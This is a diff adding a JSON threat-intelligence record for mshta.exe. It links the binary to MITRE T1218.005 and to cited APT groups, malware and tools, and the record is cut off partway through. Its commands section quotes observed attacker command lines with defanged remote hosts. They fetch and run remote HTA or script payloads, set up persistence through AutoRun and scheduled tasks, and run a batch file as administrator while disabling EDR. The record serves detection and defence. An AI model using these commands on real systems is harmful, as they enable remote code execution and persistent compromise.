@@ -1,0 +1,2828 @@
+{
+  "type": "lolbin-details",
+  "version": 2,
+  "id": "588e068a-49cc-4390-85a6-2f9025919914",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2023-09-14T19:59:11.000Z",
+  "modified": "2026-10-16T00:00:00.000Z",
+  "name": "mshta.exe",
+  "image": "mshta.exe",
+  "description": "Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.",
+  "attack": {
+    "id": "T1218.005",
+    "name": "Mshta",
+    "type": "technique",
+    "url": "https://attack.mitre.org/techniques/T1218/005",
+    "version": "20.0"
+  },
+  "summary": [
+    "Execute malicious payloads",
+    "Execute a malicious hta file",
+    "Executed malicious JavaScript code",
+    "Execute HTML pages",
+    "Execute malicious VBScript",
+    "Execute DLLs",
+    "Download and execute applications from a remote server"
+  ],
+  "required_privileges": [
+    "User"
+  ],
+  "paths": [
+    "c:\\windows\\system32\\mshta.exe",
+    "c:\\windows\\syswow64\\mshta.exe"
+  ],
+  "hashes": {
+    "MD5": "06B02D5C097C7DB1F109749C45F3F505"
+  },
+  "capabilities": [
+    "Execute",
+    "Download",
+    "Alternate data streams"
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "associated_kill_chain_phases": [
+    "TA0005:Stealth:T1218.005"
+  ],
+  "techniques": [
+    {
+      "id": "T1218.005",
+      "name": "Mshta",
+      "url": "https://attack.mitre.org/techniques/T1218/005",
+      "tactics": [
+        "Stealth"
+      ]
+    }
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "APT29",
+        "attack_id": "G0016",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "APT32",
+        "attack_id": "G0050",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "APT38",
+        "attack_id": "G0082",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Confucius",
+        "attack_id": "G0142",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Earth Lusca",
+        "attack_id": "G1006",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "FIN7",
+        "attack_id": "G0046",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Gamaredon Group",
+        "attack_id": "G0047",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Inception",
+        "attack_id": "G0100",
+        "evidence": [
+          "uses T1218.005"
+        ]
+      },
+      {
+        "name": "Kimsuky",
+        "attack_id": "G0094",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Lazarus Group",
+        "attack_id": "G0032",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "LazyScripter",
+        "attack_id": "G0140",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "MuddyWater",
+        "attack_id": "G0069",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Mustang Panda",
+        "attack_id": "G0129",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "SideCopy",
+        "attack_id": "G1008",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Sidewinder",
+        "attack_id": "G0121",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "TA2541",
+        "attack_id": "G1018",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "TA551",
+        "attack_id": "G0127",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "C0015",
+        "attack_id": "C0015",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Operation Dust Storm",
+        "attack_id": "C0016",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "BabyShark",
+        "attack_id": "S0414",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Lumma Stealer",
+        "attack_id": "S1213",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Metamorfo",
+        "attack_id": "S0455",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "NanHaiShu",
+        "attack_id": "S0228",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "POWERSTATS",
+        "attack_id": "S0223",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Pteranodon",
+        "attack_id": "S0147",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Revenge RAT",
+        "attack_id": "S0379",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Sibot",
+        "attack_id": "S0589",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      },
+      {
+        "name": "Xbash",
+        "attack_id": "S0341",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      }
+    ],
+    "associated_tools": [
+      {
+        "name": "Covenant",
+        "attack_id": "S1155",
+        "evidence": [
+          "uses T1218.005"
+        ]
+      },
+      {
+        "name": "Koadic",
+        "attack_id": "S0250",
+        "evidence": [
+          "uses T1218.005",
+          "names mshta.exe"
+        ]
+      }
+    ],
+    "technique_only": [],
+    "attack_relationships": [
+      {
+        "source": "APT29",
+        "type": "intrusion-set",
+        "attack_id": "G0016",
+        "description": "APT29 has use `mshta` to execute malicious scripts on a compromised host.",
+        "citations": [
+          {
+            "source_name": "ESET T3 Threat Report 2021",
+            "url": "https://www.welivesecurity.com/wp-content/uploads/2022/02/eset_threat_report_t32021.pdf"
+          }
+        ]
+      },
+      {
+        "source": "APT32",
+        "type": "intrusion-set",
+        "attack_id": "G0050",
+        "description": "APT32 has used mshta.exe for code execution.",
+        "citations": [
+          {
+            "source_name": "Cybereason Oceanlotus May 2017",
+            "url": "https://www.cybereason.com/blog/operation-cobalt-kitty-apt"
+          },
+          {
+            "source_name": "Cybereason Cobalt Kitty 2017",
+            "url": "https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+          }
+        ]
+      },
+      {
+        "source": "APT38",
+        "type": "intrusion-set",
+        "attack_id": "G0082",
+        "description": "APT38 has used a renamed version of `mshta.exe` to execute malicious HTML files.",
+        "citations": [
+          {
+            "source_name": "1 - appv",
+            "url": "https://securelist.com/bluenoroff-methods-bypass-motw/108383/"
+          }
+        ]
+      },
+      {
+        "source": "APT38",
+        "type": "intrusion-set",
+        "attack_id": "G0082",
+        "description": "APT38 has renamed system utilities, such as `rundll32.exe` and `mshta.exe`, to avoid detection.",
+        "citations": [
+          {
+            "source_name": "1 - appv",
+            "url": "https://securelist.com/bluenoroff-methods-bypass-motw/108383/"
+          }
+        ]
+      },
+      {
+        "source": "Confucius",
+        "type": "intrusion-set",
+        "attack_id": "G0142",
+        "description": "Confucius has used mshta.exe to execute malicious VBScript.",
+        "citations": [
+          {
+            "source_name": "TrendMicro Confucius APT Feb 2018",
+            "url": "https://www.trendmicro.com/en_us/research/18/b/deciphering-confucius-cyberespionage-operations.html"
+          }
+        ]
+      },
+      {
+        "source": "Earth Lusca",
+        "type": "intrusion-set",
+        "attack_id": "G1006",
+        "description": "Earth Lusca has used `mshta.exe` to load an HTA script within a malicious.LNK file.",
+        "citations": [
+          {
+            "source_name": "TrendMicro EarthLusca 2022",
+            "url": "https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf"
+          }
+        ]
+      },
+      {
+        "source": "FIN7",
+        "type": "intrusion-set",
+        "attack_id": "G0046",
+        "description": "FIN7 has used mshta.exe to execute VBScript to execute malicious code on victim systems.",
+        "citations": [
+          {
+            "source_name": "FireEye FIN7 April 2017",
+            "url": "https://www.fireeye.com/blog/threat-research/2017/04/fin7-phishing-lnk.html"
+          }
+        ]
+      },
+      {
+        "source": "Gamaredon Group",
+        "type": "intrusion-set",
+        "attack_id": "G0047",
+        "description": "Gamaredon Group has used `mshta.exe` to execute malicious files.",
+        "citations": [
+          {
+            "source_name": "ESET Gamaredon Sept2024",
+            "url": "https://web-assets.esetstatic.com/wls/en/papers/white-papers/cyberespionage-gamaredon-way.pdf"
+          },
+          {
+            "source_name": "Symantec Shuckworm January 2022",
+            "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+          },
+          {
+            "source_name": "SymantecCarbonBlack_ShuckwormUSB_Apr2025",
+            "url": "https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel"
+          },
+          {
+            "source_name": "unit42_gamaredon_dec2022",
+            "url": "https://unit42.paloaltonetworks.com/trident-ursa/"
+          }
+        ]
+      },
+      {
+        "source": "Gamaredon Group",
+        "type": "intrusion-set",
+        "attack_id": "G0047",
+        "description": "Gamaredon Group has used various legitimate tools, such as `mshta.exe` and Reg, and services during operations.",
+        "citations": [
+          {
+            "source_name": "ESET Gamaredon Sept2024",
+            "url": "https://web-assets.esetstatic.com/wls/en/papers/white-papers/cyberespionage-gamaredon-way.pdf"
+          },
+          {
+            "source_name": "unit42_gamaredon_dec2022",
+            "url": "https://unit42.paloaltonetworks.com/trident-ursa/"
+          }
+        ]
+      },
+      {
+        "source": "Inception",
+        "type": "intrusion-set",
+        "attack_id": "G0100",
+        "description": "Inception has used malicious HTA files to drop and execute malware.",
+        "citations": [
+          {
+            "source_name": "Kaspersky Cloud Atlas August 2019",
+            "url": "https://securelist.com/recent-cloud-atlas-activity/92016/"
+          }
+        ]
+      },
+      {
+        "source": "Kimsuky",
+        "type": "intrusion-set",
+        "attack_id": "G0094",
+        "description": "Kimsuky has used mshta.exe to run malicious scripts on the system.",
+        "citations": [
+          {
+            "source_name": "EST Kimsuky April 2019",
+            "url": "https://blog.alyac.co.kr/2234"
+          },
+          {
+            "source_name": "CISA AA20-301A Kimsuky",
+            "url": "https://us-cert.cisa.gov/ncas/alerts/aa20-301a"
+          },
+          {
+            "source_name": "Crowdstrike GTR2020 Mar 2020",
+            "url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf"
+          },
+          {
+            "source_name": "KISA Operation Muzabi",
+            "url": "https://web.archive.org/web/20220328121326/https://boho.or.kr/filedownload.do?attach_file_seq=2695&attach_file_id=EpF2695.pdf"
+          },
+          {
+            "source_name": "Aryaka Kimsuky July 2025",
+            "url": "https://www.aryaka.com/docs/reports/aryaka-kimsuky-apt-operational-blueprint.pdf"
+          }
+        ]
+      },
+      {
+        "source": "Lazarus Group",
+        "type": "intrusion-set",
+        "attack_id": "G0032",
+        "description": "Lazarus Group has used mshta.exe to execute HTML pages downloaded by initial access documents.",
+        "citations": [
+          {
+            "source_name": "Lazarus APT January 2022",
+            "url": "https://blog.malwarebytes.com/threat-intelligence/2022/01/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/"
+          },
+          {
+            "source_name": "Qualys LolZarus",
+            "url": "https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns"
+          }
+        ]
+      },
+      {
+        "source": "Lazarus Group",
+        "type": "intrusion-set",
+        "attack_id": "G0032",
+        "description": "Lazarus Group has renamed system utilities such as wscript.exe and mshta.exe.",
+        "citations": [
+          {
+            "source_name": "Qualys LolZarus",
+            "url": "https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns"
+          }
+        ]
+      },
+      {
+        "source": "LazyScripter",
+        "type": "intrusion-set",
+        "attack_id": "G0140",
+        "description": "LazyScripter has used `mshta.exe` to execute Koadic stagers.",
+        "citations": [
+          {
+            "source_name": "MalwareBytes LazyScripter Feb 2021",
+            "url": "https://web.archive.org/web/20211003035156/https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf"
+          }
+        ]
+      },
+      {
+        "source": "MuddyWater",
+        "type": "intrusion-set",
+        "attack_id": "G0069",
+        "description": "MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.",
+        "citations": [
+          {
+            "source_name": "FireEye MuddyWater Mar 2018",
+            "url": "https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html"
+          },
+          {
+            "source_name": "Securelist MuddyWater Oct 2018",
+            "url": "https://securelist.com/muddywater/88059/"
+          }
+        ]
+      },
+      {
+        "source": "Mustang Panda",
+        "type": "intrusion-set",
+        "attack_id": "G0129",
+        "description": "Mustang Panda has used mshta.exe to launch collection scripts.",
+        "citations": [
+          {
+            "source_name": "Secureworks BRONZE PRESIDENT December 2019",
+            "url": "https://www.secureworks.com/research/bronze-president-targets-ngos"
+          }
+        ]
+      },
+      {
+        "source": "SideCopy",
+        "type": "intrusion-set",
+        "attack_id": "G1008",
+        "description": "SideCopy has utilized `mshta.exe` to execute a malicious hta file.",
+        "citations": [
+          {
+            "source_name": "MalwareBytes SideCopy Dec 2021",
+            "url": "https://www.malwarebytes.com/blog/news/2021/12/sidecopy-apt-connecting-lures-to-victims-payloads-to-infrastructure"
+          }
+        ]
+      },
+      {
+        "source": "SideCopy",
+        "type": "intrusion-set",
+        "attack_id": "G1008",
+        "description": "SideCopy has sent Microsoft Office Publisher documents to victims that have embedded malicious macros that execute an hta file via calling `mshta.exe`.",
+        "citations": [
+          {
+            "source_name": "MalwareBytes SideCopy Dec 2021",
+            "url": "https://www.malwarebytes.com/blog/news/2021/12/sidecopy-apt-connecting-lures-to-victims-payloads-to-infrastructure"
+          }
+        ]
+      },
+      {
+        "source": "Sidewinder",
+        "type": "intrusion-set",
+        "attack_id": "G0121",
+        "description": "Sidewinder has used mshta.exe to execute malicious payloads.",
+        "citations": [
+          {
+            "source_name": "Rewterz Sidewinder APT April 2020",
+            "url": "https://www.rewterz.com/threats/sidewinder-apt-group-campaign-analysis"
+          },
+          {
+            "source_name": "Rewterz Sidewinder COVID-19 June 2020",
+            "url": "https://www.rewterz.com/articles/analysis-on-sidewinder-apt-group-covid-19"
+          }
+        ]
+      },
+      {
+        "source": "TA2541",
+        "type": "intrusion-set",
+        "attack_id": "G1018",
+        "description": "TA2541 has used `mshta` to execute scripts including VBS.",
+        "citations": [
+          {
+            "source_name": "Cisco Operation Layover September 2021",
+            "url": "https://blog.talosintelligence.com/operation-layover-how-we-tracked-attack/"
+          }
+        ]
+      },
+      {
+        "source": "TA551",
+        "type": "intrusion-set",
+        "attack_id": "G0127",
+        "description": "TA551 has used mshta.exe to execute malicious payloads.",
+        "citations": [
+          {
+            "source_name": "Unit 42 TA551 Jan 2021",
+            "url": "https://unit42.paloaltonetworks.com/ta551-shathak-icedid/"
+          }
+        ]
+      },
+      {
+        "source": "C0015",
+        "type": "campaign",
+        "attack_id": "C0015",
+        "description": "During C0015, the threat actors used `mshta` to execute DLLs.",
+        "citations": [
+          {
+            "source_name": "DFIR Conti Bazar Nov 2021",
+            "url": "https://thedfirreport.com/2021/11/29/continuing-the-bazar-ransomware-story/"
+          }
+        ]
+      },
+      {
+        "source": "Operation Dust Storm",
+        "type": "campaign",
+        "attack_id": "C0016",
+        "description": "During Operation Dust Storm, the threat actors executed JavaScript code via `mshta.exe`.",
+        "citations": [
+          {
+            "source_name": "Cylance Dust Storm",
+            "url": "https://s7d2.scene7.com/is/content/cylance/prod/cylance-web/en-us/resources/knowledge-center/resource-library/reports/Op_Dust_Storm_Report.pdf"
+          }
+        ]
+      },
+      {
+        "source": "BabyShark",
+        "type": "malware",
+        "attack_id": "S0414",
+        "description": "BabyShark has used mshta.exe to download and execute applications from a remote server.",
+        "citations": [
+          {
+            "source_name": "CISA AA20-301A Kimsuky",
+            "url": "https://us-cert.cisa.gov/ncas/alerts/aa20-301a"
+          }
+        ]
+      },
+      {
+        "source": "Lumma Stealer",
+        "type": "malware",
+        "attack_id": "S1213",
+        "description": "Lumma Stealer has used mshta.exe to execute additional content.",
+        "citations": [
+          {
+            "source_name": "Netskope LummaStealer 2025",
+            "url": "https://www.netskope.com/blog/lumma-stealer-fake-captchas-new-techniques-to-evade-detection"
+          },
+          {
+            "source_name": "Qualys LummaStealer 2024",
+            "url": "https://blog.qualys.com/vulnerabilities-threat-research/2024/10/20/unmasking-lumma-stealer-analyzing-deceptive-tactics-with-fake-captcha"
+          }
+        ]
+      },
+      {
+        "source": "Metamorfo",
+        "type": "malware",
+        "attack_id": "S0455",
+        "description": "Metamorfo has used mshta.exe to execute a HTA payload.",
+        "citations": [
+          {
+            "source_name": "FireEye Metamorfo Apr 2018",
+            "url": "https://www.fireeye.com/blog/threat-research/2018/04/metamorfo-campaign-targeting-brazilian-users.html"
+          }
+        ]
+      },
+      {
+        "source": "NanHaiShu",
+        "type": "malware",
+        "attack_id": "S0228",
+        "description": "NanHaiShu uses mshta.exe to load its program and files.",
+        "citations": [
+          {
+            "source_name": "fsecure NanHaiShu July 2016",
+            "url": "https://www.f-secure.com/documents/996508/1030745/nanhaishu_whitepaper.pdf"
+          }
+        ]
+      },
+      {
+        "source": "POWERSTATS",
+        "type": "malware",
+        "attack_id": "S0223",
+        "description": "POWERSTATS can use Mshta.exe to execute additional payloads on compromised hosts.",
+        "citations": [
+          {
+            "source_name": "FireEye MuddyWater Mar 2018",
+            "url": "https://www.fireeye.com/blog/threat-research/2018/03/iranian-threat-group-updates-ttps-in-spear-phishing-campaign.html"
+          }
+        ]
+      },
+      {
+        "source": "Pteranodon",
+        "type": "malware",
+        "attack_id": "S0147",
+        "description": "Pteranodon can use mshta.exe to execute an HTA file hosted on a remote server.",
+        "citations": [
+          {
+            "source_name": "Symantec Shuckworm January 2022",
+            "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+          }
+        ]
+      },
+      {
+        "source": "Revenge RAT",
+        "type": "malware",
+        "attack_id": "S0379",
+        "description": "Revenge RAT uses mshta.exe to run malicious scripts on the system.",
+        "citations": [
+          {
+            "source_name": "Cofense RevengeRAT Feb 2019",
+            "url": "https://web.archive.org/web/20200428173819/https://cofense.com/upgrades-delivery-support-infrastructure-revenge-rat-malware-bigger-threat/"
+          }
+        ]
+      },
+      {
+        "source": "Sibot",
+        "type": "malware",
+        "attack_id": "S0589",
+        "description": "Sibot has been executed via MSHTA application.",
+        "citations": [
+          {
+            "source_name": "MSTIC NOBELIUM Mar 2021",
+            "url": "https://www.microsoft.com/security/blog/2021/03/04/goldmax-goldfinder-sibot-analyzing-nobelium-malware/"
+          }
+        ]
+      },
+      {
+        "source": "Xbash",
+        "type": "malware",
+        "attack_id": "S0341",
+        "description": "Xbash can use mshta for executing scripts.",
+        "citations": [
+          {
+            "source_name": "Unit42 Xbash Sept 2018",
+            "url": "https://researchcenter.paloaltonetworks.com/2018/09/unit42-xbash-combines-botnet-ransomware-coinmining-worm-targets-linux-windows/"
+          }
+        ]
+      },
+      {
+        "source": "Covenant",
+        "type": "tool",
+        "attack_id": "S1155",
+        "description": "Covenant can create HTA files to install Grunt listeners.",
+        "citations": [
+          {
+            "source_name": "Github Covenant",
+            "url": "https://github.com/cobbr/Covenant"
+          }
+        ]
+      },
+      {
+        "source": "Koadic",
+        "type": "tool",
+        "attack_id": "S0250",
+        "description": "Koadic can use mshta to serve additional payloads and to help schedule tasks for persistence.",
+        "citations": [
+          {
+            "source_name": "MalwareBytes LazyScripter Feb 2021",
+            "url": "https://web.archive.org/web/20211003035156/https://www.malwarebytes.com/resources/files/2021/02/lazyscripter.pdf"
+          },
+          {
+            "source_name": "Github Koadic",
+            "url": "https://github.com/offsecginger/koadic"
+          }
+        ]
+      }
+    ],
+    "associated_commands": [
+      {
+        "command": "HKCU\\Software\\Microsoft\\Command Processor\\AutoRun, value: \"powershell.exe mshta hxxps://tdalpacafarm[.]com/files/kr/contents/Usoro.hta",
+        "intent": "Persistence: BabyShark's AutoRun value runs mshta to fetch a remote HTA whenever cmd.exe starts, and scheduled tasks make sure cmd.exe is launched.",
+        "status": "verified",
+        "source_name": "Unit 42 BabyShark February 2019",
+        "source_url": "https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/"
+      },
+      {
+        "command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Command Processor\" /v AutoRun /t REG_SZ /d \"powershell.exe start-process -windowstyle hidden -filepath mshta.exe hxxps://bit-albania[.]com/[REDACTED]/Drfwj.hta\" /f",
+        "intent": "Persistence: set cmd.exe's AutoRun so the BabyShark second-stage HTA downloader runs whenever cmd.exe starts.",
+        "status": "verified",
+        "source_name": "Crowdstrike GTR2020 Mar 2020",
+        "source_url": "https://go.crowdstrike.com/rs/281-OBQ-266/images/Report2020CrowdStrikeGlobalThreatReport.pdf"
+      },
+      {
+        "command": "Powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -noexit -c Invoke-Command -ScriptBlock { schtasks /create /TN AutomaticChromeUpdater /TR 'mshta hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate' /SC minute /mo 60} \"C:\\WINDOWS\\system32\\schtasks.exe\" /create /TN AutomaticChromeUpdater /TR \"mshta hxxp://hpsj.firewall-gateway.net:8080/MicrosoftUpdate\" /SC minute /mo 60",
+        "intent": "Koadic persistence: a scheduled task named AutomaticChromeUpdater runs mshta against the attacker's server every 60 minutes.",
+        "status": "verified",
+        "source_name": "Malwarebytes LazyScripter February 2021",
+        "source_url": "https://www.malwarebytes.com/wp-content/uploads/sites/2/2023/09/lazyscripter.pdf"
+      },
+      {
+        "command": "shellObj.Run \"forfiles /p c:\\windows /m HelpPane.exe /c \"\"mshta C:\\WMAuthorization\\WMPlaybackSrv \"\"hxxps://markettrendingcenter.com/member.htm\"\"\"\"\", 0, True",
+        "intent": "Periodic beacon to the attacker's server, run by a VBS file that a scheduled task starts every 20 minutes.",
+        "status": "verified",
+        "source_name": "Qualys LolZarus Lazarus Group February 2022",
+        "source_url": "https://blog.qualys.com/vulnerabilities-threat-research/2022/02/08/lolzarus-lazarus-group-incorporating-lolbins-into-campaigns/"
+      },
+      {
+        "command": "mshta hxxp://45.147.231[.]210:9999/8k6Mq",
+        "intent": "Execution of Koadic: the intruders used an mshta launcher with JavaScript, and the two executions created child processes that loaded stage 2 into memory.",
+        "status": "verified",
+        "source_name": "The DFIR Report PYSA Mespinoza Ransomware November 2020",
+        "source_url": "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/"
+      },
+      {
+        "command": "schtasks /create /tn K0adic /tr \"C:\\Windows\\system32\\mshta.exe C:\\ProgramData\\SZWXNUHHDP.hta\" /sc onlogon /ru System /f",
+        "intent": "Persistence: Koadic scheduled a task that runs a HTA file from C:\\ProgramData at logon as SYSTEM, which starts C2 back to the Koadic server.",
+        "status": "verified",
+        "source_name": "The DFIR Report PYSA Mespinoza Ransomware November 2020",
+        "source_url": "https://thedfirreport.com/2020/11/23/pysa-mespinoza-ransomware/"
+      },
+      {
+        "command": "schtasks /create /sc MINUTE /tn \"Windows Error Reporting\" /tr \"mshta.exe about:'<script language=\\\"vbscript\\\" src=\\\"hxxp://110.10.179(.)65:80/download/microsoftp.jpg\\\">code close</script>'\" /mo 15 /F",
+        "intent": "Scheduled task created by the spear-phishing macro that runs mshta every 15 minutes to download another payload (a script disguised as a .jpg) from the C&C server.",
+        "status": "verified",
+        "source_name": "Cybereason Operation Cobalt Kitty May 2017",
+        "source_url": "https://cdn2.hubspot.net/hubfs/3354902/Cybereason%20Labs%20Analysis%20Operation%20Cobalt%20Kitty.pdf"
+      },
+      {
+        "command": "mshta hxxps://zilk[.]pw/url/index.hta",
+        "intent": "After the user opened the fake invoice document attachment, it ran mshta against a remote HTA that executed a PowerShell script, which downloaded and executed the FormBook information stealer.",
+        "status": "verified",
+        "source_name": "Unit 42 CVE-2017-11882 Exploit in the Wild December 2017",
+        "source_url": "https://unit42.paloaltonetworks.com/unit42-analysis-of-cve-2017-11882-exploit-in-the-wild/"
+      },
+      {
+        "command": "\"C:\\Program Files (x86)\\Unidocs\\ezPDFReader2.0G\\..\\..\\..\\Windows\\System32\\mshta.exe\" \"hxxp://www.jinjinpig.co[.]kr/AnyCss/skin.html\" /print",
+        "intent": "Alternative infection method seen in telemetry: mshta launched from the ezPDFReader folder path to fetch an HTA payload from a compromised website.",
+        "status": "verified",
+        "source_name": "Kaspersky Andariel Evolves to Target South Korea with Ransomware June 2021",
+        "source_url": "https://securelist.com/andariel-evolves-to-target-south-korea-with-ransomware/102811/"
+      },
+      {
+        "command": "\"CSIDL_SYSTEM\\cmd.exe\" /c CSIDL_SYSTEM\\mshta.exe hxxp://fiordan.ru/FILM.html /f id=[REDACTED]",
+        "intent": "Execution of an HTA file hosted on a remote server by abusing mshta.exe via depended.exe.",
+        "status": "verified",
+        "source_name": "Symantec Shuckworm Continues Cyber-Espionage Attacks Against Ukraine January 2022",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+      },
+      {
+        "command": "mshta.exe hxxp://PLAZMA.VIBER.ontroma.ru/PLAZMA.html /f id=January",
+        "intent": "The MediaConvertor.dat script searches for removable drives and creates a .lnk file on them with this command.",
+        "status": "verified",
+        "source_name": "Symantec Shuckworm Continues Cyber-Espionage Attacks Against Ukraine January 2022",
+        "source_url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/shuckworm-gamaredon-espionage-ukraine"
+      },
+      {
+        "command": "\"C:\\Windows\\System32\\mshta.exe\" javascript:eval('w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"explorer files\");w.run(\"wscript.exe //e:vbScript \\~.drv\");window.close()')",
+        "intent": "After the infection started from an LNK file on an external drive, explorer.exe launched mshta.exe to run JavaScript that opens the files folder and runs the obfuscated ~.drv VBScript, which creates two files and executes them.",
+        "status": "verified",
+        "source_name": "Symantec Shuckworm GammaSteel April 2025",
+        "source_url": "https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel"
+      },
+      {
+        "command": "mshta.exe hxxp://a0704093.xsph[.]ru/bass/grudge.xml /f",
+        "intent": "The LNK files executed mshta.exe to download and parse a remote XML file, which executes a malicious PowerShell script.",
+        "status": "verified",
+        "source_name": "Cisco Talos Gamaredon APT Targets Ukrainian Government Agencies September 2022",
+        "source_url": "https://blog.talosintelligence.com/gamaredon-apt-targets-ukrainian-agencies/"
+      },
+      {
+        "command": "mshta vbscript:CreateObject(Shell.Application).ShellExecute(cmd.exe,/c C:\\Users\\xx\\xxx\\HRSword\\HRSWOR~1.BAT ::,,runas,1)",
+        "intent": "To execute HRSword.exe while disabling EDR, the attackers ran a batch file with administrator privileges using VBScript via mshta with the runas option in ShellExecute.",
+        "status": "verified",
+        "source_name": "Cisco Talos Uncovering Qilin Attack Methods October 2025",
+        "source_url": "https://blog.talosintelligence.com/uncovering-qilin-attack-methods-exposed-through-multiple-cases/"
+      },
+      {
+        "command": "'c:\\windows\\system32\\mshta.exe' javascript:bz0pbzykh='qoethfr1';jo9=new%20activexobject('wscript.shell'); tkk4qffrj='wrqxzpuvp';zv0v5w=jo9.regread('hklm\\\\software\\\\wow6432node\\\\88b21b0b\\\\7f490d53');v9tjbmpoy='nwzv9xiv';eval(zv0v5w);wqfccxdq4='u';",
+        "intent": "Observed HTA abuse that reads a binary object from a registry key with regread() and evals it, which then starts a PowerShell child process that runs a script with iex (consistent with Poweliks or Win32/Xswkit).",
+        "status": "verified",
+        "source_name": "Red Canary Microsoft HTML Application HTA Abuse Part Deux August 2015",
+        "source_url": "https://www.redcanary.com/blog/microsoft-html-application-hta-abuse-part-deux/"
+      },
+      {
+        "command": "forfiles.exe /p C:\\Windows /m win.ini /c \"powershell . mshta hxxps://nextomax.b-cdn[.]net/nexto\"",
+        "intent": "LNK parameters used forfiles.exe to run PowerShell, which retrieved a second-stage payload from a remote URL and executed it via mshta.exe.",
+        "status": "verified",
+        "source_name": "Mandiant PEAKLIGHT Memory-Only Dropper August 2024",
+        "source_url": "https://cloud.google.com/blog/topics/threat-intelligence/peaklight-decoding-stealthy-memory-only-malware"
+      },
+      {
+        "command": "mshta hXXp://81.0x5a.29[.]64/ebc/rps.gz",
+        "intent": "ClickFix command copied to the clipboard (Run dialog paste) that uses mshta.exe to execute a JScript payload, the first stage of a chain ending in the steganographic Stego Loader and stealers.",
+        "status": "verified",
+        "source_name": "Huntress ClickFix Malware Buried in Images November 2025",
+        "source_url": "https://www.huntress.com/blog/clickfix-malware-buried-in-images"
+      },
+      {
+        "command": "mshta hXXp://141.0x62.80[.]175/very.dat",
+        "intent": "Malicious command passed to navigator.clipboard.writeText() by the fake Windows Update ClickFix page, starting the same mshta.exe to PowerShell to Stego Loader chain.",
+        "status": "verified",
+        "source_name": "Huntress ClickFix Malware Buried in Images November 2025",
+        "source_url": "https://www.huntress.com/blog/clickfix-malware-buried-in-images"
+      },
+      {
